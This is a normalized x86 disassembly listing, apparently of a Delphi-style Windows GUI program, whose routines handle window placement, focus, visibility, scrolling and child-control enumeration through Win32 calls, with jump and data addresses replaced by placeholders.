cmp [ eax + 0xd ] 0x0
je r-xdata
mov dx 0xb03d
mov eax ebx
call sub_4416f8
pop esi
pop ebx
retn
cmp [ esi + 0x4 ] 0x0
jne r-xdata
mov eax ebx
call sub_441f08
sub_443d1c
push ebx
push esi
mov ebx eax
mov eax [ rw-data ]
cmp [ eax + 0xd ] 0x0
je r-xdata
mov eax ebx
mov si 0xffc2
call sub_40348c
pop esi
pop ebx
retn
mov eax ebx
call sub_43e790
test al al
je r-xdata
mov eax [ rw-data ]
mov eax [ eax ]
cmp [ eax + 0x3c ] 0x0
je r-xdata
mov eax [ rw-data ]
mov eax [ eax ]
cmp [ eax + 0x38 ] 0x0
je r-xdata
push 0x1
mov eax [ rw-data ]
mov eax [ eax ]
mov eax [ eax + 0x3c ]
call sub_4044a0
push eax
call LoadKeyboardLayoutA
push 0x1
mov eax [ rw-data ]
mov eax [ eax ]
mov eax [ eax + 0x38 ]
call sub_4044a0
push eax
call LoadKeyboardLayoutA
jmp r-xdata
sub_443d9c
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_4422e8
test al al
jne r-xdata
pop esi
pop ebx
retn
mov edx esi
mov eax ebx
call sub_43fedc
sub_443dfc
push ebx
mov ebx eax
cmp [ ebx + 0x57 ] 0x0
jne r-xdata
test [ ebx + 0x1c ] 0x10
je r-xdata
cmp [ ebx + 0x30 ] 0x0
je r-xdata
mov eax ebx
call sub_44205c
test [ ebx + 0x51 ] 0x4
je r-xdata
xor edx edx
mov eax ebx
call sub_441458
pop ebx
retn
sub_443e2c
xor edx edx
mov dl [ eax + 0x1a6 ]
movzx edx [ edx * 2 + rw-data ]
push edx
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
mov eax [ eax + 0x180 ]
push eax
call SetWindowPos
retn
sub_443e54
push ebx
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x50 ]
test al al
jne r-xdata
mov eax ebx
call sub_444c6c
test al al
je r-xdata
cmp [ ebx + 0x30 ] 0x0
je r-xdata
pop ebx
retn
test [ ebx + 0x1c ] 0x10
jne r-xdata
xor edx edx
mov eax ebx
call sub_441458
mov eax ebx
mov edx [ eax ]
call [ edx + 0x50 ]
neg al
sbb eax eax
push eax
mov eax [ ebx + 0x180 ]
push eax
call EnableWindow
sub_443ec4
push ebx
mov ebx eax
mov eax ebx
call sub_43fd48
mov eax ebx
call sub_444c6c
test al al
je r-xdata
mov dx 0xb008
mov eax ebx
call sub_4416f8
pop ebx
retn
push 0x0
mov eax [ ebx + 0x68 ]
call sub_41c73c
mov ecx eax
mov edx 0x30
mov eax ebx
call sub_43f334
sub_443f00
push ebx
add esp 0xfffffff8
mov ebx eax
call GetCapture
test eax eax
jne r-xdata
pop ecx
pop edx
pop ebx
retn
push esp
call GetCursorPos
mov eax esp
xor edx edx
call sub_43c9f8
cmp ebx eax
jne r-xdata
push 0x1
mov eax ebx
call sub_444968
mov ecx eax
mov edx 0x20
mov eax ebx
call sub_43f334
sub_443f40
push esi
mov esi eax
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
mov eax esi
call sub_444c6c
test al al
je r-xdata
pop esi
retn
push 0x37
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
mov eax esi
call sub_444968
push eax
call SetWindowPos
cmp [ esi + 0x57 ] 0x0
je r-xdata
mov eax esi
mov edx [ eax ]
call [ edx + 0x7c ]
sub_443f80
push ebx
mov ebx eax
test [ ebx + 0x50 ] 0x10
je r-xdata
mov dx 0xb011
mov eax ebx
call sub_4416f8
pop ebx
retn
cmp [ ebx + 0x30 ] 0x0
je r-xdata
mov eax ebx
call sub_444c6c
test al al
je r-xdata
mov eax [ ebx + 0x180 ]
push eax
call IsWindowVisible
test eax eax
je r-xdata
mov eax ebx
call sub_444870
sub_443fc0
push ebx
mov ebx eax
cmp [ ebx + 0x1a9 ] 0x0
je r-xdata
pop ebx
retn
cmp [ edx + 0x4 ] 0x0
je r-xdata
mov eax [ ebx + 0x30 ]
mov dl [ eax + 0x1a5 ]
mov eax ebx
call sub_444aa8
cmp [ edx + 0x8 ] 0x0
setne al
mov edx eax
mov eax ebx
call sub_444aa8
jmp r-xdata
mov [ ebx + 0x1a9 ] 0x1
sub_444020
push ebx
push esi
push edi
push ebp
add esp 0xfffffff8
mov ebx edx
mov esi eax
mov edi [ ebx + 0x8 ]
mov al [ ebx + 0x4 ]
sub al 0x4
jb r-xdata
cmp [ edi + 0xc ] 0x0
je r-xdata
dec al
je r-xdata
pop ecx
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
mov edx ebx
mov eax [ edi + 0xc ]
call sub_43ed90
jmp r-xdata
push 0x0
lea ecx [ esp + 0x4 ]
mov edx edi
mov eax esi
call sub_43dc90
lea edx [ esp + 0x4 ]
xor ecx ecx
mov eax esi
call sub_442254
mov ebp eax
mov [ ebx + 0xc ] ebp
test ebp ebp
jne r-xdata
jmp r-xdata
mov [ ebx + 0xc ] esi
sub_444090
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_43fe80
mov edx esi
mov eax ebx
call sub_4416b8
pop esi
pop ebx
retn
sub_4440ac
push ebx
push esi
push edi
push ebp
add esp 0xfffffff8
mov ebp edx
mov [ esp ] eax
mov [ esp + 0x4 ] 0x1
mov eax [ esp ]
test [ eax + 0x1c ] 0x10
jne r-xdata
mov ecx [ ebp + 0x8 ]
movzx edx [ ebp + 0x4 ]
mov eax 0xb016
call sub_43b034
test eax eax
jne r-xdata
mov ebx [ esp ]
test ebx ebx
je r-xdata
mov al [ esp + 0x4 ]
pop ecx
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
mov [ esp + 0x4 ] 0x0
mov eax [ esp ]
call sub_4553f0
mov ebx eax
test ebx ebx
je r-xdata
mov eax ebx
mov si 0xffd6
call sub_40348c
mov edi eax
test edi edi
je r-xdata
mov edx ebp
mov eax ebx
mov si 0xffab
call sub_40348c
test al al
jne r-xdata
mov ebx [ ebx + 0x30 ]
test ebx ebx
jne r-xdata
cmp [ edi + 0x38 ] 0x0
je r-xdata
mov edx ebp
mov eax edi
mov si 0xffef
call sub_40348c
test al al
jne r-xdata
sub_444140
push ebx
push esi
push edi
mov esi edx
mov ebx eax
mov [ esi + 0xc ] 0x1
mov dx [ esi + 0x4 ]
mov eax ebx
call sub_445ad4
mov edx esi
mov eax ebx
call sub_4440ac
test al al
jne r-xdata
pop edi
pop esi
pop ebx
retn
test [ ebx + 0x1c ] 0x10
jne r-xdata
xor eax eax
mov [ esi + 0xc ] eax
push ebx
movzx ecx [ esi + 0x4 ]
mov edx 0xb02e
mov eax ebx
call sub_43f334
test eax eax
jne r-xdata
xor edi edi
movzx eax [ esi + 0x4 ]
cmp eax 0x1b
jg r-xdata
add eax 0xffffffdb
sub eax 0x4
jb r-xdata
je r-xdata
mov edi 0x1
jmp r-xdata
sub eax 0x2
je r-xdata
mov edi 0x4
sub eax 0x3
je r-xdata
test edi edi
je r-xdata
jmp r-xdata
push 0x0
movzx ecx [ esi + 0x4 ]
mov edx 0xb01e
mov eax ebx
call sub_43f334
test eax eax
jne r-xdata
sub eax 0x6
je r-xdata
push 0x0
xor ecx ecx
mov edx 0x87
mov eax ebx
call sub_43f334
test eax edi
jne r-xdata
mov edi 0x2
jmp r-xdata
sub eax 0x4
je r-xdata
mov eax [ esi + 0x8 ]
push eax
mov eax ebx
call sub_4553f0
movzx ecx [ esi + 0x4 ]
mov edx 0xb005
call sub_43f334
test eax eax
jne r-xdata
jmp r-xdata
sub_444224
push ebx
push esi
push edi
mov esi edx
mov ebx eax
test [ ebx + 0x1c ] 0x10
jne r-xdata
pop edi
pop esi
pop ebx
retn
mov di [ esi + 0x4 ]
movzx eax di
cmp eax 0x1b
jg r-xdata
add eax 0xffffffdb
sub eax 0x4
jb r-xdata
je r-xdata
push 0x0
movzx ecx di
mov edx 0xb01e
mov eax ebx
call sub_43f334
mov [ esi + 0xc ] eax
sub eax 0x2
jne r-xdata
sub eax 0x3
je r-xdata
sub eax 0x6
je r-xdata
sub eax 0x4
je r-xdata
jmp r-xdata
sub_444278
push ebx
push esi
mov esi edx
mov ebx eax
test [ ebx + 0x1c ] 0x10
jne r-xdata
pop esi
pop ebx
retn
mov [ esi + 0xc ] 0x1
push 0x0
xor ecx ecx
mov edx 0x87
mov eax ebx
call sub_43f334
test al 0x80
jne r-xdata
xor eax eax
mov [ esi + 0xc ] eax
mov eax [ esi + 0x8 ]
push eax
mov eax ebx
call sub_4553f0
movzx ecx [ esi + 0x4 ]
mov edx 0xb006
call sub_43f334
test eax eax
jne r-xdata
sub_4442c4
push ebx
push esi
mov esi edx
mov ebx eax
mov [ esi + 0xc ] 0x1
mov edx esi
mov eax ebx
call sub_4440ac
test al al
jne r-xdata
pop esi
pop ebx
retn
test [ ebx + 0x1c ] 0x10
jne r-xdata
xor eax eax
mov [ esi + 0xc ] eax
push ebx
movzx ecx [ esi + 0x4 ]
mov edx 0xb02e
mov eax ebx
call sub_43f334
test eax eax
jne r-xdata
mov eax [ esi + 0x8 ]
push eax
mov eax ebx
call sub_4553f0
movzx ecx [ esi + 0x4 ]
mov edx 0xb005
call sub_43f334
test eax eax
jne r-xdata
sub_444320
push ebx
push esi
mov esi edx
mov ebx eax
test [ ebx + 0x1c ] 0x10
jne r-xdata
pop esi
pop ebx
retn
cmp [ esi + 0x4 ] 0x20
je r-xdata
mov eax [ esi + 0x8 ]
push eax
mov eax ebx
call sub_4553f0
movzx ecx [ esi + 0x4 ]
mov edx 0xb006
call sub_43f334
mov [ esi + 0xc ] eax
sub_444354
push ebp
mov ebp esp
add esp 0xffffffc4
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
cmp esi [ ebx + 0x40 ]
jne r-xdata
mov eax ebx
call sub_444c6c
test al al
je r-xdata
cmp edi [ ebx + 0x44 ]
jne r-xdata
mov [ ebx + 0x40 ] esi
mov [ ebx + 0x44 ] edi
mov eax [ ebp + 0xc ]
mov [ ebx + 0x48 ] eax
mov eax [ ebp + 0x8 ]
mov [ ebx + 0x4c ] eax
mov eax ebx
call sub_444c6c
test al al
je r-xdata
mov eax [ ebx + 0x180 ]
push eax
call IsIconic
test eax eax
jne r-xdata
mov eax [ ebp + 0xc ]
cmp eax [ ebx + 0x48 ]
jne r-xdata
mov eax ebx
call sub_43d7a0
mov eax ebx
mov si 0xffd0
call sub_40348c
mov [ ebp - 0x2c ] 0x2c
lea eax [ ebp - 0x2c ]
push eax
mov eax [ ebx + 0x180 ]
push eax
call GetWindowPlacement
lea edx [ ebp - 0x3c ]
mov eax ebx
call sub_43daec
lea esi [ ebp - 0x3c ]
lea edi [ ebp - 0x10 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
lea eax [ ebp - 0x2c ]
push eax
mov eax [ ebx + 0x180 ]
push eax
call SetWindowPlacement
push 0x14
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebp + 0xc ]
push eax
push edi
push esi
push 0x0
mov eax [ ebx + 0x180 ]
push eax
call SetWindowPos
jmp r-xdata
mov eax [ ebp + 0x8 ]
cmp eax [ ebx + 0x4c ]
je r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
sub_44442c
push ebx
push esi
push edi
push ebp
add esp 0xfffffff8
mov [ esp + 0x4 ] ecx
mov [ esp ] edx
mov ebp eax
mov eax ebp
call sub_441698
mov ebx eax
dec ebx
test ebx ebx
jl r-xdata
pop ecx
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
inc ebx
xor edi edi
mov edx edi
mov eax ebp
call sub_44165c
mov ecx [ esp + 0x4 ]
mov edx [ esp ]
mov si 0xffec
call sub_40348c
inc edi
dec ebx
jne r-xdata
sub_444474
push ebp
mov ebp esp
push ecx
push ebx
push esi
mov esi ecx
mov ebx edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_441200
xor eax eax
push ebp
push sub_444512
push [ fs : eax ]
mov [ fs : eax ] esp
mov ecx esi
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_44442c
cmp esi ebx
je r-xdata
mov ecx esi
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_43dd68
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_444519
mov eax [ ebp - 0x4 ]
call sub_441208
retn
mov eax [ ebp - 0x4 ]
test [ eax + 0x1c ] 0x2
je r-xdata
mov eax [ ebp - 0x4 ]
test [ eax + 0x98 ] 0x20
je r-xdata
push esi
push ebx
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x1fa ]
push eax
call sub_406118
mov edx [ ebp - 0x4 ]
mov [ edx + 0x1fa ] eax
push esi
push ebx
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x1fe ]
push eax
call sub_406118
mov edx [ ebp - 0x4 ]
mov [ edx + 0x1fe ] eax
sub_444520
push ebx
push esi
push edi
push ebp
add esp 0xfffffff4
mov [ esp + 0x4 ] ecx
mov [ esp ] edx
mov edi eax
mov ebx [ edi + 0x180 ]
test ebx ebx
je r-xdata
xor eax eax
jmp r-xdata
push ebx
call IsWindowVisible
test eax eax
jne r-xdata
mov [ esp + 0x8 ] al
cmp [ esp + 0x8 ] 0x0
je r-xdata
mov al 0x1
mov eax edi
call sub_441698
mov esi eax
dec esi
test esi esi
jl r-xdata
push 0x0
push 0x0
mov eax [ esp + 0xc ]
push eax
mov eax [ esp + 0xc ]
push eax
mov eax [ edi + 0x180 ]
push eax
call ScrollWindow
mov eax edi
call sub_441228
add esp 0xc
pop ebp
pop edi
pop esi
pop ebx
retn
inc esi
xor ebp ebp
mov eax [ esp ]
add [ ebx + 0x40 ] eax
mov eax [ esp + 0x4 ]
add [ ebx + 0x44 ] eax
jmp r-xdata
cmp [ ebx + 0x180 ] 0x0
jne r-xdata
inc ebp
dec esi
jne r-xdata
cmp [ esp + 0x8 ] 0x0
jne r-xdata
mov edx ebp
mov eax edi
call sub_44165c
mov ebx eax
mov eax ebx
mov edx [ r-xdata ]
call sub_40341c
test al al
je r-xdata
push 0x14
mov eax ebx
mov edx [ eax + 0x4c ]
push edx
mov edx [ eax + 0x48 ]
push edx
mov edx [ eax + 0x44 ]
add edx [ esp + 0x10 ]
push edx
mov edx [ eax + 0x40 ]
add edx [ esp + 0x10 ]
push edx
push 0x0
mov eax [ eax + 0x180 ]
push eax
call SetWindowPos
sub_444610
push ebx
push esi
push edi
push ebp
mov esi edx
mov ebx eax
mov eax [ ebx + 0x30 ]
test eax eax
je r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
mov edx [ eax + 0x198 ]
test edx edx
je r-xdata
mov eax [ eax + 0x19c ]
mov edx ebx
call sub_413ad0
mov edi eax
test edi edi
jl r-xdata
sub esi [ edx + 0x8 ]
cmp [ ebx + 0x180 ] 0x0
je r-xdata
mov eax [ ebx + 0x30 ]
mov edx [ eax + 0x19c ]
mov eax [ edx + 0x8 ]
test esi esi
jge r-xdata
test esi esi
jne r-xdata
cmp eax esi
jg r-xdata
xor esi esi
mov eax [ ebx + 0x30 ]
mov ebp [ eax + 0x19c ]
mov eax [ ebp + 0x8 ]
dec eax
cmp esi eax
jne r-xdata
mov eax 0x1
jmp r-xdata
cmp edi esi
je r-xdata
mov esi eax
dec esi
cmp edi esi
jge r-xdata
xor eax eax
jmp r-xdata
push 0x3
push 0x0
push 0x0
push 0x0
push 0x0
push eax
mov eax [ ebx + 0x180 ]
push eax
call SetWindowPos
mov eax edx
mov edx edi
call sub_413964
mov eax [ ebx + 0x30 ]
mov eax [ eax + 0x19c ]
mov ecx ebx
mov edx esi
call sub_413af0
cmp edi esi
jle r-xdata
lea edx [ esi + 0x1 ]
mov eax ebp
call sub_413a74
call sub_444968
jmp r-xdata
mov eax ebp
mov edx esi
call sub_413a74
call sub_444968
sub_4446e8
push ebx
push esi
mov ebx [ eax + 0x30 ]
test ebx ebx
je r-xdata
mov ecx [ eax + 0x180 ]
test ecx ecx
je r-xdata
test dl dl
je r-xdata
pop esi
pop ebx
retn
push 0x3
push 0x0
push 0x0
push 0x0
push 0x0
and edx 0x7f
movzx edx [ edx * 2 + rw-data ]
push edx
push ecx
call SetWindowPos
xor ecx ecx
mov edx [ ebx + 0x19c ]
mov ecx [ edx + 0x8 ]
dec ecx
jmp r-xdata
add ecx edx
mov edx ecx
call sub_444610
pop esi
pop ebx
retn
mov edx [ esi + 0x8 ]
xor edx edx
mov esi [ ebx + 0x198 ]
test esi esi
je r-xdata
sub_444748
push ebx
push esi
mov esi edx
mov ebx eax
test [ ebx + 0x1c ] 0x10
je r-xdata
mov eax ebx
call sub_444968
push eax
call GetDC
push 0x12
push 0x0
mov eax ebx
call sub_444968
push eax
call GetDCEx
jmp r-xdata
mov edx [ ebx + 0x180 ]
mov [ esi ] edx
pop esi
pop ebx
retn
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b54c
call sub_403a1c
test eax eax
jne r-xdata
sub_4447ac
push ebx
push esi
push edi
mov esi edx
mov ebx eax
mov eax ebx
call sub_444c6c
test al al
je r-xdata
pop edi
pop esi
pop ebx
retn
mov eax [ ebx + 0x30 ]
test eax eax
je r-xdata
cmp [ esi + 0x4 ] 0x0
jne r-xdata
push 0x0
mov ecx 0x1
mov edx 0xb034
call sub_43f334
test [ ebx + 0x50 ] 0x40
setne al
xor al 0x1
neg al
sbb eax eax
push eax
push 0x0
mov eax [ ebx + 0x180 ]
push eax
call InvalidateRect
call sub_4301bc
call sub_43029c
test al al
je r-xdata
mov eax ebx
call sub_441698
mov edi eax
dec edi
test edi edi
jl r-xdata
inc edi
xor esi esi
inc esi
dec edi
jne r-xdata
mov edx esi
mov eax ebx
call sub_44165c
mov edx [ eax ]
call [ edx + 0x7c ]
mov edx esi
mov eax ebx
call sub_44165c
test [ eax + 0x52 ] 0x4
je r-xdata
sub_444870
push ebx
add esp 0xfffffff0
mov ebx eax
mov edx esp
mov eax ebx
call sub_43daec
push 0x1
push 0x1
lea eax [ esp + 0x8 ]
push eax
call InflateRect
push 0xffffffff
lea eax [ esp + 0x4 ]
push eax
mov eax [ ebx + 0x30 ]
mov eax [ eax + 0x180 ]
push eax
call InvalidateRect
add esp 0x10
pop ebx
retn
sub_4448a8
push ebx
push esi
push ecx
mov ebx eax
mov [ esp ] 0x0
mov eax ebx
call sub_4553f0
mov esi eax
test esi esi
je r-xdata
mov al [ esp ]
pop edx
pop esi
pop ebx
retn
cmp esi ebx
je r-xdata
mov [ esp ] 0x1
cmp [ ebx + 0x57 ] 0x0
je r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0x50 ]
test al al
je r-xdata
mov ebx [ ebx + 0x30 ]
cmp esi ebx
jne r-xdata
sub_4448e8
push ebx
mov ebx eax
mov eax ebx
call sub_4553f0
test eax eax
je r-xdata
cmp [ ebx + 0x190 ] 0x0
je r-xdata
mov edx ebx
call sub_45915c
pop ebx
retn
mov eax ebx
call sub_455418
mov eax ebx
call sub_444968
push eax
call SetFocus
jmp r-xdata
pop ebx
retn
sub_444920
push ebx
mov ebx eax
cmp [ ebx + 0x180 ] 0x0
je r-xdata
xor eax eax
pop ebx
retn
call GetFocus
cmp eax [ ebx + 0x180 ]
je r-xdata
mov al 0x1
pop ebx
retn
sub_444944
push ebx
mov ebx eax
cmp [ ebx + 0x180 ] 0x0
jne r-xdata
pop ebx
retn
mov eax [ ebx + 0x30 ]
test eax eax
je r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0x94 ]
call sub_444944
sub_44497c
push ebx
push esi
push edi
push ebp
mov ebx edx
mov edi eax
push 0x0
push ebx
xor ecx ecx
mov edx 0x7fffffff
mov eax 0x7fffffff
call sub_412640
mov eax edi
call sub_441698
mov esi eax
dec esi
test esi esi
jl r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
inc esi
xor ebp ebp
mov edx [ ebx ]
cmp edx [ eax + 0x40 ]
jle r-xdata
test [ eax + 0x1c ] 0x10
je r-xdata
mov edx [ ebx + 0x4 ]
cmp edx [ eax + 0x44 ]
jle r-xdata
mov edx [ eax + 0x40 ]
mov [ ebx ] edx
inc ebp
dec esi
jne r-xdata
test [ eax + 0x51 ] 0x4
jne r-xdata
mov edx [ eax + 0x40 ]
add edx [ eax + 0x48 ]
cmp edx [ ebx + 0x8 ]
jle r-xdata
mov edx [ eax + 0x44 ]
mov [ ebx + 0x4 ] edx
mov edx ebp
mov eax edi
call sub_44165c
cmp [ eax + 0x57 ] 0x0
jne r-xdata
mov edx [ eax + 0x44 ]
add edx [ eax + 0x4c ]
cmp edx [ ebx + 0xc ]
jle r-xdata
mov edx [ eax + 0x40 ]
add edx [ eax + 0x48 ]
mov [ ebx + 0x8 ] edx
mov edx [ eax + 0x44 ]
add edx [ eax + 0x4c ]
mov [ ebx + 0xc ] edx
sub_444a10
push ebx
push esi
mov ebx edx
mov esi eax
xor eax eax
mov [ ebx ] eax
xor eax eax
mov [ ebx + 0x4 ] eax
push ebx
mov eax esi
call sub_444968
push eax
call ClientToScreen
pop esi
pop ebx
retn
sub_444a48
push ebx
push esi
mov ebx eax
test [ ebx + 0x1c ] 0x1
jne r-xdata
pop esi
pop ebx
retn
mov eax ebx
call sub_444c6c
test al al
je r-xdata
push 0x16
mov eax [ ebx + 0x4c ]
push eax
mov eax [ ebx + 0x48 ]
push eax
push 0x0
push 0x0
push 0x0
mov eax ebx
call sub_444968
push eax
call SetWindowPos
mov eax ebx
mov si 0xffd0
call sub_40348c
sub_444b04
push ebx
push esi
mov ebx eax
mov esi [ ebx + 0x30 ]
test esi esi
je r-xdata
or eax 0xffffffff
pop esi
pop ebx
retn
mov eax [ esi + 0x194 ]
mov edx ebx
call sub_413ad0
pop esi
pop ebx
retn
sub_444b28
push ebx
push esi
push edi
push ebp
mov esi edx
mov ebx eax
mov eax ebx
call sub_444b04
movsx eax ax
test eax eax
jl r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
mov edx [ ebx + 0x30 ]
mov ebp [ edx + 0x194 ]
mov edx [ ebp + 0x8 ]
test si si
jge r-xdata
movsx ecx si
cmp edx ecx
jg r-xdata
xor esi esi
movsx edi si
cmp eax edi
je r-xdata
mov esi edx
dec esi
mov edx ebp
xchg edx eax
call sub_413964
mov edx edi
mov eax [ ebx + 0x30 ]
mov eax [ eax + 0x194 ]
mov ecx ebx
call sub_413af0
sub_444b9c
push ebx
push esi
mov ebx edx
mov esi eax
cmp bl [ esi + 0x1a4 ]
je r-xdata
pop esi
pop ebx
retn
mov [ esi + 0x1a4 ] bl
mov eax esi
call sub_444c6c
test al al
je r-xdata
push 0x0
xor ecx ecx
mov edx 0xb028
mov eax esi
call sub_43f334
push 0xfffffff0
mov eax [ esi + 0x180 ]
push eax
call GetWindowLongA
and eax 0xfffeffff
test bl bl
je r-xdata
push eax
push 0xfffffff0
mov eax [ esi + 0x180 ]
push eax
call SetWindowLongA
or eax 0x10000
sub_444bfc
push ebp
mov ebp esp
push 0x0
push ebx
push esi
mov ebx eax
xor eax eax
push ebp
push sub_444c60
push [ fs : eax ]
mov [ fs : eax ] esp
cmp dl [ ebx + 0x1a7 ]
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_444c67
lea eax [ ebp - 0x4 ]
call sub_40564c
retn
mov [ ebx + 0x1a7 ] dl
test [ ebx + 0x1c ] 0x10
setne al
xor al 0x1
test al dl
je r-xdata
lea edx [ ebp - 0x4 ]
mov eax ebx
mov si 0xffc6
call sub_40348c
mov edx [ ebp - 0x4 ]
lea eax [ ebx + 0x17c ]
call sub_405664
sub_444c78
push ebx
push esi
push edi
add esp 0xffffffc4
mov ebx eax
mov eax [ ebx + 0x180 ]
push eax
call IsIconic
test eax eax
je r-xdata
push esp
mov eax [ ebx + 0x180 ]
push eax
call GetWindowRect
mov [ esp + 0x10 ] 0x2c
lea eax [ esp + 0x10 ]
push eax
mov eax [ ebx + 0x180 ]
push eax
call GetWindowPlacement
lea esi [ esp + 0x2c ]
mov edi esp
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
jmp r-xdata
mov eax [ esp ]
mov [ ebx + 0x40 ] eax
mov eax [ esp + 0x4 ]
mov [ ebx + 0x44 ] eax
mov eax [ esp + 0x8 ]
sub eax [ esp ]
mov [ ebx + 0x48 ] eax
mov eax [ esp + 0xc ]
sub eax [ esp + 0x4 ]
mov [ ebx + 0x4c ] eax
mov eax ebx
call sub_43d7a0
add esp 0x3c
pop edi
pop esi
pop ebx
retn
push 0xfffffff8
mov eax [ ebx + 0x180 ]
push eax
call GetWindowLongA
mov esi eax
test esi esi
je r-xdata
push 0xfffffff0
mov eax [ ebx + 0x180 ]
push eax
call GetWindowLongA
test eax 0x40000000
je r-xdata
push esp
push esi
call ScreenToClient
lea eax [ esp + 0x8 ]
push eax
push esi
call ScreenToClient
sub_444d30
push ebx
push esi
push edi
push ebp
add esp 0xfffffff8
mov [ esp ] edx
mov ebp eax
mov eax [ ebp + 0x194 ]
test eax eax
je r-xdata
pop ecx
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
mov edi [ eax + 0x8 ]
dec edi
test edi edi
jl r-xdata
inc edi
mov [ esp + 0x4 ] 0x0
mov eax [ ebp + 0x194 ]
mov edx [ esp + 0x4 ]
call sub_413a74
mov ebx eax
mov edx ebx
mov eax [ esp ]
call sub_413918
mov edx [ esp ]
mov eax ebx
mov si 0xffb4
call sub_40348c
inc [ esp + 0x4 ]
dec edi
jne r-xdata
sub_444d90
push ebp
mov ebp esp
add esp 0xffffffec
push ebx
push esi
push edi
mov [ ebp - 0x5 ] cl
mov edi edx
mov [ ebp - 0x4 ] eax
xor eax eax
mov [ ebp - 0xc ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_403260
mov [ ebp - 0x14 ] eax
xor eax eax
push ebp
push sub_444e86
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx [ ebp - 0x14 ]
mov eax [ ebp - 0x4 ]
mov si 0xffb4
call sub_40348c
mov eax [ ebp - 0x14 ]
cmp [ eax + 0x8 ] 0x0
jle r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_444e8d
mov eax [ ebp - 0x14 ]
call sub_403290
retn
mov edx edi
mov eax [ ebp - 0x14 ]
call sub_413ad0
mov [ ebp - 0x10 ] eax
cmp [ ebp - 0x10 ] 0xffffffff
jne r-xdata
mov ebx [ ebp - 0x10 ]
cmp [ ebp - 0x5 ] 0x0
je r-xdata
test ebx ebx
jne r-xdata
inc ebx
mov eax [ ebp - 0x14 ]
cmp ebx [ eax + 0x8 ]
jne r-xdata
xor eax eax
mov [ ebp - 0x10 ] eax
mov eax [ ebp - 0x14 ]
mov eax [ eax + 0x8 ]
dec eax
mov [ ebp - 0x10 ] eax
jmp r-xdata
dec ebx
mov eax [ ebp - 0x14 ]
mov ebx [ eax + 0x8 ]
mov edx ebx
mov eax [ ebp - 0x14 ]
call sub_413a74
mov edi eax
mov eax edi
mov si 0xffb8
call sub_40348c
test al al
je r-xdata
xor ebx ebx
jmp r-xdata
cmp [ ebp - 0xc ] 0x0
jne r-xdata
cmp [ ebp + 0xc ] 0x0
je r-xdata
cmp ebx [ ebp - 0x10 ]
jne r-xdata
cmp [ ebp + 0x8 ] 0x0
je r-xdata
cmp [ edi + 0x1a4 ] 0x0
je r-xdata
cmp [ ebp - 0x5 ] 0x0
je r-xdata
mov [ ebp - 0xc ] edi
mov eax [ edi + 0x30 ]
cmp eax [ ebp - 0x4 ]
jne r-xdata
sub_444e9c
push ebp
mov ebp esp
push esi
mov esi edx
mov edx [ ebp + 0x8 ]
push edx
xor dl 0x1
push edx
mov edx esi
call sub_444d90
mov esi eax
test esi esi
je r-xdata
pop esi
pop ebp
retn 0x4
mov eax esi
mov edx [ eax ]
call [ edx + 0xc4 ]
sub_444ec8
push ebx
push esi
mov ebx eax
mov eax ebx
call sub_4553f0
mov esi eax
test esi esi
je r-xdata
pop esi
pop ebx
retn
push 0x1
push 0x0
mov cl 0x1
xor edx edx
mov eax ebx
call sub_444d90
test eax eax
jne r-xdata
test eax eax
je r-xdata
push 0x0
push 0x0
mov cl 0x1
xor edx edx
mov eax ebx
call sub_444d90
mov edx eax
mov eax esi
call sub_45905c
sub_444f0c
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_441698
mov ebx eax
dec ebx
test ebx ebx
jl r-xdata
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn 0x8
inc ebx
xor esi esi
inc esi
dec ebx
jne r-xdata
mov edx eax
mov eax [ ebp + 0xc ]
call [ ebp + 0x8 ]
mov edx esi
mov eax [ ebp - 0x4 ]
call sub_44165c
mov edx [ eax + 0x4 ]
cmp edx [ ebp - 0x8 ]
jne r-xdata
sub_444f54
push ebx
push esi
mov esi ecx
mov ebx edx
mov eax ebx
mov edx [ r-xdata ]
call sub_40341c
test al al
je r-xdata
mov eax ebx
mov edx [ r-xdata ]
call sub_40341c
test al al
je r-xdata
mov edx esi
mov eax ebx
call sub_444610
pop esi
pop ebx
retn
pop esi
pop ebx
retn
mov edx esi
mov eax ebx
call sub_43e3bc
sub_444f9c
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi edx
mov esi eax
mov eax [ esi + 0x74 ]
cmp [ eax + 0x14 ] 0x0
jbe r-xdata
xor edx edx
mov [ edi ] edx
